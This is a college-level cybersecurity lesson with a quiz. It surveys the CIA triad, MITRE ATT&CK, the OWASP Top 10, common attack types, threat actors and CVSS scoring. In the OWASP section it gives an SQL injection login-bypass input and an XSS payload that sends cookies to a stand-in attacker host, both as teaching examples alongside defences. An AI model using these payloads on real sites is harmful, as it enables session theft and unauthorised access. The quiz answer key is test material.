@@ -1,0 +1,491 @@
+title: "Threat Landscape & Attack Vectors"
+order: 1
+summary: "A college-level survey of the modern cybersecurity threat landscape: the CIA triad, MITRE ATT&CK, OWASP Top 10, common attack classes, threat actor taxonomy, CVE/CVSS scoring, and defense-in-depth architecture — with Linux recon commands and real-world case studies."
+learning_objectives:
+  - "Define Confidentiality, Integrity, and Availability and apply the CIA triad to real-world security scenarios."
+  - "Navigate the MITRE ATT&CK framework and map adversary TTPs to detection strategies."
+  - "Identify and explain the OWASP Top 10 web application vulnerabilities with concrete exploitation examples."
+  - "Distinguish between the key attack types: phishing, SQL injection, XSS, buffer overflow, MITM, DDoS, and ransomware."
+  - "Classify threat actors by motivation and capability (nation-state, criminal, insider, hacktivist)."
+  - "Differentiate between vulnerability, threat, and risk using industry-standard definitions."
+  - "Interpret a CVE entry and calculate a CVSS v3.1 base score."
+  - "Describe a defense-in-depth architecture and use basic Linux commands for reconnaissance awareness."
+builds_on:
+  - "Linux command-line fundamentals (SYS 202) — ping, netstat, whois, curl are used throughout this lesson"
+sections:
+  - heading: "The CIA Triad — Foundation of Information Security"
+    content: |
+      ## The CIA Triad — Foundation of Information Security
+
+      Every decision in information security ultimately traces back to three fundamental
+      properties — **Confidentiality**, **Integrity**, and **Availability** — collectively
+      known as the **CIA triad**. Published in NIST SP 800-33 and enshrined in ISO/IEC
+      27001, the triad provides the conceptual language for defining security requirements,
+      classifying incidents, and evaluating controls.
+
+      ### Confidentiality
+      Confidentiality ensures that information is accessible **only to those authorised** to
+      access it. Violations include data breaches (Equifax 2017: 147 million SSNs exfiltrated),
+      insider leaks, and eavesdropping. Technical controls include encryption (AES-256, TLS 1.3),
+      access control lists (ACLs), and role-based access control (RBAC). The principle of
+      **least privilege** — granting users only the minimum permissions necessary — is the
+      primary architectural countermeasure.
+
+      ### Integrity
+      Integrity guarantees that data has **not been altered** by unauthorised parties, either
+      in transit or at rest. Violations include database tampering, log wiping after a breach,
+      or a supply-chain attack that injects malicious code (SolarWinds 2020). Controls include
+      cryptographic hashing (SHA-256), digital signatures, file integrity monitoring (AIDE,
+      Tripwire), and write-once audit logs. NIST defines integrity as preventing "unauthorized
+      modification or destruction of information" (FIPS 199).
+
+      ### Availability
+      Availability ensures that systems and data are **accessible when needed**. Violations
+      include DDoS attacks (Dyn DNS 2016 took down Twitter, Netflix, Reddit), ransomware
+      encrypting file servers, and hardware failure. Controls include redundancy (RAID, failover
+      clusters), rate limiting, CDN offloading, and UPS/generator systems.
+
+      ```mermaid
+      graph TD
+          CIA["CIA Triad"]
+          C["Confidentiality\nOnly authorised access\nEncryption · RBAC · Least Privilege"]
+          I["Integrity\nData not tampered\nHashing · Digital Signatures · AIDE"]
+          A["Availability\nSystems accessible\nRedundancy · DDoS mitigation · Backups"]
+
+          CIA --> C
+          CIA --> I
+          CIA --> A
+
+          style CIA fill:#2C3E50,color:#fff
+          style C  fill:#2980B9,color:#fff
+          style I  fill:#27AE60,color:#fff
+          style A  fill:#C0392B,color:#fff
+      ```
+
+      **Real-world tension:** Security controls often trade off one property against another.
+      Encrypting every field in a database improves confidentiality but may harm availability
+      (decryption latency). Strict access controls protect confidentiality but can hinder
+      availability if authentication services go down. Security architects must consciously
+      balance these trade-offs.
+
+      A fourth property — **Non-repudiation** — is sometimes added (forming the "CIAN" model).
+      Non-repudiation means a sender cannot later deny having sent a message. It is achieved
+      through digital signatures and audit logs, and is critical in legal and financial contexts
+      (e-signatures under the US ESIGN Act, 2000).
+
+  - heading: "MITRE ATT&CK Framework"
+    content: |
+      ## MITRE ATT&CK Framework
+
+      The **MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) framework,
+      maintained by MITRE Corporation, is the industry-standard taxonomy for cataloguing
+      adversary behaviour *after* initial access. Unlike CVEs (which catalogue vulnerabilities),
+      ATT&CK catalogues what attackers *do* once inside. As of ATT&CK v14, the Enterprise
+      matrix contains **14 tactics** and over **200 techniques** with sub-techniques.
+
+      ### The 14 Enterprise Tactics (in kill-chain order)
+      | # | Tactic | Description |
+      |---|--------|-------------|
+      | 1 | Reconnaissance | Gather info before attacking (OSINT, scanning) |
+      | 2 | Resource Development | Acquire infrastructure (buy domains, compile malware) |
+      | 3 | Initial Access | First foothold (phishing, exploit public-facing app) |
+      | 4 | Execution | Run malicious code (PowerShell, scripting engine) |
+      | 5 | Persistence | Maintain presence (cron jobs, registry run keys) |
+      | 6 | Privilege Escalation | Gain higher permissions (sudo abuse, SUID exploit) |
+      | 7 | Defense Evasion | Hide activity (log tampering, process hollowing) |
+      | 8 | Credential Access | Steal passwords (keylogging, LSASS dump) |
+      | 9 | Discovery | Map the environment (net commands, ps, netstat) |
+      | 10 | Lateral Movement | Move to other systems (SSH pivoting, PsExec) |
+      | 11 | Collection | Gather target data (screenshot, keylog, file scrape) |
+      | 12 | Command & Control | Communicate with implant (C2 beaconing, DNS tunnelling) |
+      | 13 | Exfiltration | Transfer stolen data out (HTTPS exfil, cloud storage) |
+      | 14 | Impact | Cause damage (ransomware, data destruction, defacement) |
+
+      **Practical use:** Security Operations Centre (SOC) analysts map alerts from SIEM tools
+      (Splunk, Microsoft Sentinel) to ATT&CK IDs to prioritise investigation. For example,
+      a Sigma rule that fires on `T1059.004 – Unix Shell Execution` triggers analyst review of
+      suspicious bash invocations. Detection engineers write rules for high-priority techniques;
+      red teams use ATT&CK to plan realistic adversary simulations.
+
+      ```mermaid
+      graph LR
+          R["Reconnaissance\nT1595 Active Scanning\nT1589 Gather Victim Info"]
+          IA["Initial Access\nT1566 Phishing\nT1190 Exploit Public App"]
+          EX["Execution\nT1059 Command Scripting\nT1203 Exploitation"]
+          PE["Privilege Escalation\nT1548 Abuse Elevation\nT1068 Exploit Vuln"]
+          LM["Lateral Movement\nT1021 Remote Services\nT1550 Pass-the-Hash"]
+          EXF["Exfiltration\nT1041 Exfil over C2\nT1048 Exfil Alt Proto"]
+
+          R --> IA --> EX --> PE --> LM --> EXF
+
+          style R   fill:#8E44AD,color:#fff
+          style IA  fill:#C0392B,color:#fff
+          style EX  fill:#D35400,color:#fff
+          style PE  fill:#D4A017,color:#000
+          style LM  fill:#16A085,color:#fff
+          style EXF fill:#2C3E50,color:#fff
+      ```
+
+  - heading: "OWASP Top 10 Web Application Vulnerabilities"
+    content: |
+      ## OWASP Top 10 Web Application Vulnerabilities
+
+      The **Open Web Application Security Project (OWASP)** publishes its Top 10 list of the
+      most critical web application security risks. The 2021 edition reflects both frequency and
+      exploitability. Understanding these vulnerabilities is mandatory for any developer or
+      security practitioner working with web systems.
+
+      ### A01:2021 — Broken Access Control
+      Access control enforces policy that restricts users from acting outside their permissions.
+      Failures allow attackers to access other users' accounts, view sensitive files, modify
+      data, or perform administrative functions. Example: changing `?user_id=42` to `?user_id=1`
+      in a URL to access another user's records (Insecure Direct Object Reference, IDOR).
+
+      ### A02:2021 — Cryptographic Failures (formerly "Sensitive Data Exposure")
+      Weak or absent cryptography exposes sensitive data. Failures include: transmitting data
+      in cleartext (HTTP instead of HTTPS), using deprecated algorithms (MD5, SHA-1 for
+      passwords, RC4 for TLS), hardcoding passwords in source code, and improper certificate
+      validation. The 2013 Adobe breach exposed 153 million poorly encrypted passwords.
+
+      ### A03:2021 — Injection
+      Injection occurs when untrusted data is sent to an interpreter as part of a command or
+      query. **SQL injection** is the canonical example:
+
+      ```sql
+      -- Vulnerable PHP query:
+      SELECT * FROM users WHERE username = '$username' AND password = '$password';
+
+      -- Attacker input for username field:
+      admin' --
+
+      -- Resulting query (password check bypassed):
+      SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
+      ```
+
+      Other injection types include OS command injection, LDAP injection, and NoSQL injection.
+      Prevention: parameterised queries (prepared statements), stored procedures, input validation.
+
+      ### A04:2021 — Insecure Design
+      A new category in 2021 focusing on missing or ineffective security controls at the
+      design stage. Threat modelling (STRIDE, DREAD) should occur during architecture, not
+      post-deployment. Example: a password reset flow that relies solely on a 4-digit PIN
+      is a design flaw regardless of implementation quality.
+
+      ### A07:2021 — Identification and Authentication Failures
+      Weaknesses in authentication: no account lockout (brute force), weak password policies,
+      plain-text passwords in logs, predictable session tokens. **Cross-Site Request Forgery
+      (CSRF)** is closely related — an attacker tricks a victim's browser into making
+      authenticated requests without consent.
+
+      ### A03 Deep Dive — Cross-Site Scripting (XSS)
+      XSS allows attackers to inject client-side scripts into web pages viewed by other users.
+      Three types:
+      - **Stored XSS:** malicious script persisted in database, served to every visitor.
+      - **Reflected XSS:** script embedded in URL, reflected back in response.
+      - **DOM-based XSS:** script manipulates DOM without touching the server.
+
+      Example malicious payload injected into a comment field:
+      ```html
+      <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+      ```
+      Prevention: Content Security Policy (CSP) headers, output encoding, HttpOnly cookie flag.
+
+  - heading: "Common Attack Types"
+    content: |
+      ## Common Attack Types
+
+      ### Phishing & Social Engineering
+      **Phishing** is the fraudulent attempt to obtain credentials or install malware by
+      disguising communications as legitimate. Variants include:
+      - **Spear phishing:** targeted at a specific individual, using personal details for
+        credibility. The 2016 DNC breach began with a spear-phishing email to John Podesta.
+      - **Whaling:** targets C-suite executives.
+      - **Smishing/Vishing:** phishing via SMS or voice call.
+      - **Business Email Compromise (BEC):** impersonating executives to authorise wire transfers.
+
+      Social engineering exploits human psychology (authority, urgency, scarcity, liking) rather
+      than technical vulnerabilities. Mitnick's *The Art of Deception* (2002) documents how
+      social engineering bypasses even strong technical controls. Controls: security awareness
+      training, multi-factor authentication (MFA), DMARC/DKIM/SPF email authentication.
+
+      ### SQL Injection (SQLi)
+      Detailed in the OWASP section above. SQLi can lead to authentication bypass, full
+      database dump, file system access, and remote code execution (via `xp_cmdshell` in MSSQL
+      or `SELECT INTO OUTFILE` in MySQL). Detection: WAF rules, database query logging,
+      parameterised queries. The 2007 Heartland Payment Systems breach (134 million cards
+      stolen) began with a SQL injection attack.
+
+      ### Cross-Site Scripting (XSS)
+      Covered in depth in the OWASP section. XSS can steal session cookies, perform actions
+      as the victim, redirect to malware pages, or capture keystrokes via injected JavaScript.
+
+      ### Buffer Overflow
+      A buffer overflow occurs when a programme writes more data to a fixed-length buffer than
+      it was designed to hold, corrupting adjacent memory. Stack-based overflows can overwrite
+      the **return address**, redirecting execution to attacker-controlled shellcode. The Morris
+      Worm (1988) used a buffer overflow in `fingerd`. Modern mitigations:
+      - **ASLR** (Address Space Layout Randomisation): randomises memory layout.
+      - **NX/DEP** (No-Execute / Data Execution Prevention): marks stack non-executable.
+      - **Stack Canaries:** sentinel values placed before the return address; checked before
+        function return. Provided by gcc's `-fstack-protector-strong`.
+
+      ```bash
+      # Check ASLR status on Linux
+      cat /proc/sys/kernel/randomize_va_space
+      # 0 = disabled, 1 = partial, 2 = full (default)
+
+      # Check if binary has stack canaries and NX enabled
+      checksec --file=/usr/bin/ls
+      # Output: RELRO, STACK CANARY, NX enabled, PIE enabled
+      ```
+
+      ### Man-in-the-Middle (MITM)
+      In a MITM attack, the adversary intercepts and optionally modifies communications between
+      two parties who believe they are communicating directly. ARP spoofing is the classic LAN
+      MITM vector: the attacker sends gratuitous ARP replies associating the gateway's IP with
+      their MAC address, diverting all traffic through their machine.
+
+      ```bash
+      # Detect ARP spoofing — multiple IPs sharing one MAC is suspicious
+      arp -n | sort -k3 | uniq -f2 -d
+
+      # Monitor ARP cache on Linux
+      watch -n1 'arp -n'
+      ```
+      Detection: dynamic ARP inspection (DAI) on managed switches, static ARP entries,
+      HTTPS (TLS certificate pinning prevents SSL stripping).
+
+      ### Distributed Denial of Service (DDoS)
+      DDoS floods a target with traffic from thousands of compromised machines (a botnet),
+      exhausting bandwidth, CPU, or connection state. Attack types:
+      - **Volumetric:** UDP flood, DNS amplification (attacker spoofs victim IP in DNS requests;
+        resolver sends large response to victim). Amplification factor for DNS can be 50×.
+      - **Protocol:** SYN flood (exhausts TCP half-open connection table).
+      - **Application Layer (L7):** HTTP GET flood, Slowloris (holds connections open).
+
+      The 2016 Dyn DDoS (Mirai botnet, 1.2 Tbps) exploited IoT devices with default credentials.
+      Mitigation: rate limiting (`iptables -m limit`), anycast routing, CDN scrubbing, SYN
+      cookies (`net.ipv4.tcp_syncookies=1`).
+
+      ### Ransomware
+      Ransomware encrypts victim files and demands payment (typically cryptocurrency) for the
+      decryption key. Modern ransomware (REvil, Conti, LockBit) employs a **double extortion**
+      model: exfiltrate data *before* encrypting, then threaten to publish it. The Colonial
+      Pipeline ransomware attack (2021) caused fuel shortages across the US East Coast.
+      Prevention: immutable offline backups, network segmentation, EDR, MFA on RDP.
+
+  - heading: "Threat Actor Taxonomy"
+    content: |
+      ## Threat Actor Taxonomy
+
+      Understanding *who* attacks systems — and *why* — is essential for proportionate risk
+      management. NIST SP 800-150 defines threat actors by capability, motivation, and intent.
+
+      | Actor Type | Motivation | Capability | Example |
+      |------------|-----------|------------|---------|
+      | **Nation-State (APT)** | Espionage, sabotage, political influence | Very high — zero-day exploits, custom malware | APT29 (Cozy Bear, Russia) — SolarWinds 2020; APT41 (China) |
+      | **Organised Crime** | Financial gain | High — RaaS (Ransomware-as-a-Service) | REvil, Conti, Lazarus Group (North Korea) |
+      | **Insider Threat** | Sabotage, financial gain, coercion | High (privileged access) | Edward Snowden, Tesla insider data theft 2023 |
+      | **Hacktivist** | Political / ideological | Medium | Anonymous (#OpISIS), LulzSec |
+      | **Script Kiddie** | Notoriety, curiosity | Low — uses existing tools | Most website defacement attacks |
+      | **Competitor** | Corporate espionage | Variable | Waymo vs Uber trade secret case |
+
+      **Advanced Persistent Threat (APT):** An APT is a stealthy, long-duration attack campaign
+      typically attributed to nation-state actors or sponsored groups. The key characteristics are
+      *persistence* (months to years of dwell time), *stealth* (living-off-the-land techniques
+      to avoid AV), and *sophistication* (custom implants, zero-day exploitation). FireEye's
+      2020 Mandiant report found the median attacker dwell time in APAC was 54 days before detection.
+
+  - heading: "Vulnerability, Threat, and Risk"
+    content: |
+      ## Vulnerability, Threat, and Risk
+
+      These three terms are frequently confused but have precise meanings in security
+      (defined in NIST SP 800-30 Rev. 1):
+
+      - **Vulnerability:** A weakness in a system, application, or process that *could* be
+        exploited. Example: an unpatched Apache server running a version vulnerable to
+        CVE-2021-41773 (path traversal / RCE, CVSS 9.8).
+      - **Threat:** A potential cause of an incident — anything that *might* exploit a
+        vulnerability. A threat can be intentional (attacker), accidental (admin error), or
+        environmental (flood). Example: a financially motivated ransomware actor scanning for
+        exposed RDP endpoints.
+      - **Risk:** The *likelihood* that a threat will exploit a vulnerability, combined with
+        the *impact* if it does. NIST defines Risk = Likelihood × Impact.
+
+      ```mermaid
+      graph LR
+          V["Vulnerability\n(Unpatched software)"]
+          T["Threat\n(Ransomware actor)"]
+          R["Risk\n= Likelihood × Impact"]
+          C["Control\n(Patch, Firewall, MFA)"]
+
+          T -- "exploits" --> V
+          V -- "creates" --> R
+          C -- "reduces" --> R
+
+          style V fill:#C0392B,color:#fff
+          style T fill:#8E44AD,color:#fff
+          style R fill:#D35400,color:#fff
+          style C fill:#27AE60,color:#fff
+      ```
+
+      ### CVE and CVSS Scoring
+      **Common Vulnerabilities and Exposures (CVE)** is a dictionary of publicly disclosed
+      security vulnerabilities, maintained by MITRE and funded by the US government (NVD at
+      nvd.nist.gov). Each CVE has the format `CVE-YYYY-NNNNN`. Example:
+      `CVE-2021-44228` — Log4Shell, a critical JNDI injection in Apache Log4j 2.
+
+      **Common Vulnerability Scoring System (CVSS) v3.1** assigns a numerical score (0–10)
+      based on Base, Temporal, and Environmental metric groups. The Base Score uses:
+
+      | Metric Group | Metrics |
+      |---|---|
+      | **Exploitability** | Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction |
+      | **Impact** | Confidentiality Impact, Integrity Impact, Availability Impact |
+      | **Scope** | Whether exploitation affects resources beyond the vulnerable component |
+
+      Log4Shell (CVE-2021-44228): AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H
+      **CVSS Base Score: 10.0 (Critical)**
+
+      ```bash
+      # Query NVD for CVE details using the NVD API
+      curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" \
+        | python3 -m json.tool | grep -A5 '"cvssMetricV31"'
+      ```
+
+  - heading: "Defense-in-Depth Architecture"
+    content: |
+      ## Defense-in-Depth Architecture
+
+      **Defense-in-depth** (DiD) is the security strategy of layering multiple independent
+      security controls so that if one fails, others still protect the asset. The concept
+      originates with medieval castle design (moat → walls → keep → inner vault) and was
+      formalised for IT security by the NSA in 2001. NIST SP 800-53 Rev. 5 operationalises
+      DiD through its control families.
+
+      ```mermaid
+      graph TD
+          INET["Internet / Untrusted Network"]
+          FW1["Perimeter Firewall / DDoS Scrubbing"]
+          DMZ["DMZ\nWeb Servers · Reverse Proxy · WAF"]
+          FW2["Internal Firewall"]
+          CORP["Corporate Network\nEndpoint EDR · NAC · 802.1X"]
+          IAM["Identity & Access Management\nMFA · PAM · RBAC"]
+          DATA["Data Layer\nEncryption at Rest · DLP · Audit Logs"]
+
+          INET --> FW1 --> DMZ --> FW2 --> CORP --> IAM --> DATA
+
+          style INET fill:#C0392B,color:#fff
+          style FW1  fill:#D35400,color:#fff
+          style DMZ  fill:#D4A017,color:#000
+          style FW2  fill:#D35400,color:#fff
+          style CORP fill:#2980B9,color:#fff
+          style IAM  fill:#8E44AD,color:#fff
+          style DATA fill:#27AE60,color:#fff
+      ```
+
+      ### Layers of Defense
+
+      **1. Perimeter / Network Security:** Firewalls, IDS/IPS, DDoS mitigation, VPN gateways.
+      A properly configured perimeter reduces attack surface but is *never* sufficient alone
+      (perimeter-only is "hard shell, soft interior" — one phishing email defeats it).
+
+      **2. Endpoint Security:** EDR (Endpoint Detection & Response) solutions (CrowdStrike,
+      SentinelOne), host-based firewalls, application allowlisting, OS hardening (CIS
+      Benchmarks). Patching cadence is critical — the vast majority of exploited
+      vulnerabilities had patches available for > 60 days before exploitation (Verizon DBIR 2023).
+
+      **3. Identity & Access Management (IAM):** MFA is the single highest-ROI security control
+      per Microsoft's 2023 Digital Defense Report (blocks 99.9% of credential attacks). PAM
+      (Privileged Access Management) vaults for admin accounts. Zero Trust principles: "never
+      trust, always verify" regardless of network location.
+
+      **4. Data Security:** Encryption at rest (LUKS for Linux disks, AES-256) and in transit
+      (TLS 1.3). Data Loss Prevention (DLP) solutions scan outbound traffic. Immutable backups
+      (3-2-1 rule: 3 copies, 2 media types, 1 offsite).
+
+      **5. Monitoring & Response:** SIEM (Security Information and Event Management) aggregates
+      logs; SOC analysts triage alerts. IR (Incident Response) plans per NIST SP 800-61 Rev. 2:
+      Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned.
+
+      ### Linux Recon Awareness Commands
+      Security defenders use the same recon tools that attackers use — understanding what
+      information is visible helps you reduce your own attack surface:
+
+      ```bash
+      # What open ports and listening services are visible?
+      ss -tlnp                          # local listening TCP ports
+      sudo netstat -tlnp                # alternative (older systems)
+
+      # What services are running and auto-starting?
+      systemctl list-units --type=service --state=running
+      systemctl list-unit-files --state=enabled
+
+      # What user accounts exist? Any with UID 0 (root)?
+      awk -F: '($3 == 0) { print $1 }' /etc/passwd
+      cat /etc/passwd | awk -F: '{print $1, $3, $7}'
+
+      # What SUID/SGID binaries exist? (common privesc vector)
+      find / -perm /6000 -type f 2>/dev/null
+
+      # What world-writable files exist?
+      find / -writable -type f 2>/dev/null | grep -v proc
+
+      # Check for failed login attempts (brute force indicators)
+      grep "Failed password" /var/log/auth.log | tail -20
+      lastb | head -20
+
+      # What outbound connections are active?
+      ss -tnp state established
+
+      # External IP and open port recon (as an attacker would see you)
+      curl -s https://ifconfig.me
+      whois $(curl -s https://ifconfig.me)
+      ```
+
+quiz:
+  - question: "A hospital's Electronic Health Record (EHR) system is encrypted by ransomware and taken offline for 12 hours, preventing doctors from accessing patient records. Which property of the CIA triad is primarily violated?"
+    options:
+      - "Confidentiality — patient data was exposed to unauthorised parties"
+      - "Integrity — patient records were altered by the ransomware"
+      - "Availability — authorised users cannot access the system when needed"
+      - "Non-repudiation — the hospital cannot prove who accessed the records"
+    answer: 2
+    explanation: "Availability is the property that systems and data must be accessible to authorised users when needed. Ransomware encrypting and taking a system offline is a textbook availability attack. Confidentiality (data exposure) and Integrity (unauthorised modification) may also be violated by modern double-extortion ransomware, but the primary and immediate impact here is Availability."
+
+  - question: "A penetration tester discovers that a web application concatenates user input directly into a SQL query without sanitisation. According to the OWASP Top 10 (2021), this falls under which category?"
+    options:
+      - "A01 — Broken Access Control"
+      - "A02 — Cryptographic Failures"
+      - "A03 — Injection"
+      - "A07 — Identification and Authentication Failures"
+    answer: 2
+    explanation: "Injection (A03:2021) covers SQL injection, OS command injection, LDAP injection, and similar vulnerabilities where untrusted data is sent to an interpreter as part of a command or query. The fix is parameterised queries (prepared statements) and input validation."
+
+  - question: "CVE-2021-44228 (Log4Shell) was assigned a CVSS v3.1 Base Score of 10.0. Which Attack Vector metric value contributes most significantly to this maximum score?"
+    options:
+      - "Local — the attacker must have local system access"
+      - "Adjacent — the attacker must be on the same network segment"
+      - "Network — the attacker can exploit this remotely over the internet"
+      - "Physical — requires physical access to the device"
+    answer: 2
+    explanation: "The Attack Vector of 'Network' (AV:N) means the vulnerability is exploitable remotely over the internet without any local access. Combined with low Attack Complexity, no Privileges Required, no User Interaction, and Complete (High) impacts on Confidentiality, Integrity, and Availability, these values produce the maximum CVSS Base Score of 10.0."
+
+  - question: "An adversary sends DNS queries with spoofed source IP addresses (set to the victim's IP) to open DNS resolvers. The resolvers respond with large DNS answers directed at the victim's IP. What attack technique is this?"
+    options:
+      - "DNS Cache Poisoning"
+      - "DNS Amplification (Volumetric DDoS)"
+      - "DNS Tunnelling for C2"
+      - "DNSSEC Downgrade Attack"
+    answer: 1
+    explanation: "DNS Amplification is a volumetric DDoS technique that abuses open DNS resolvers. The attacker spoofs the victim's IP as the source address in small DNS queries; the resolvers send large responses (amplification factor up to 50×) to the victim, overwhelming its bandwidth. Mitigation includes BCP38 (ingress filtering to block spoofed IPs) and rate-limiting DNS responses."
+
+  - question: "Which MITRE ATT&CK tactic describes an adversary's actions to remain in a compromised environment across system restarts — for example, by installing a malicious cron job?"
+    options:
+      - "Initial Access (TA0001)"
+      - "Defense Evasion (TA0005)"
+      - "Persistence (TA0003)"
+      - "Privilege Escalation (TA0004)"
+    answer: 2
+    explanation: "Persistence (TA0003) encompasses techniques adversaries use to maintain their foothold across reboots, credential changes, or other interruptions. Installing a malicious cron job maps to T1053.003 (Scheduled Task/Job: Cron). Detecting persistence mechanisms is a core SOC task: monitor crontabs, systemd unit files, and shell profile modifications."
